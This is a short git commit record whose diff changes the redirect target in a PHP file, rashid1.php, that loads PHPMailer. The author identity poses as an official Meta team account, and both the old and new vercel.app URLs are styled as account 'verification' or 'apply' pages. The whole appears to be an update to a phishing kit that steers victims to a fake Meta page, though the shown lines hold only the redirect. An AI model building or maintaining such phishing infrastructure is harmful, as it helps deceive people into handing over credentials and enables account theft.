32bf14e62b8ad6392a6e8e55aedd3101a1d091db
officialmetateamverified <official.meta.team.verified.here@gmail.com>
2025-07-28 18:32:24 +0800

    Update rashid1.php

--- rashid1.php
+++ rashid1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-again-apply.vercel.app/");
+header("Location: https://team-page-verification-here-request.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
